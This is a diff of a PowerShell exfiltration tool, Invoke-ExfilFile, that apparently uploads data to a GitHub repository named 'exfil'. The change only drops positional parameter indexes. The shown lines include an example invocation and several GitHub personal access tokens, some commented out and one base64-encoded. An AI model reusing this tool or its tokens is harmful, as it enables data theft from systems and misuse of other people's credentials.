@@ -46,29 +46,29 @@ Invoke-ExfilFile -GHUser nnh100 -GHRepo exfil -GHPAT "6ad6248b0c3e98ba430a07a237
 
     [CmdletBinding()] Param(
 
-        [Parameter(Position = 0, Mandatory = $False)]
+        [Parameter(Mandatory = $False)]
         [String]
         $GHUser = "nnh100",
 
-        [Parameter(Position = 1, Mandatory = $False)]
+        [Parameter(Mandatory = $False)]
         [String]
         $GHRepo = "exfil",
 
-        [Parameter(Position = 2, Mandatory = $False)]
+        [Parameter(Mandatory = $False)]
         [String]
         #$GHPAT = "325e15bcc471887d08651a2a4e1cd1a87b76314e",
         #$GHPAT = "6ad6248b0c3e98ba430a07a2379e49855b56e6c2",
         $GHPAT = "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0YQ==", # This should be base 64 encoded
 
-        [Parameter(Position =3, Mandatory = $False)]
+        [Parameter(Mandatory = $False)]
         [String]
         $GHFilePath = "testfolder2/",
 
-        [Parameter(Position = 4, Mandatory = $False)]
+        [Parameter(Mandatory = $False)]
         [String]
         $GHFileName = "testfile1",
 
-        [Parameter(Position = 5, Mandatory = $False)]
+        [Parameter(Mandatory = $False)]
         [String]
         $data = "this is a test to see if i can update this"
 
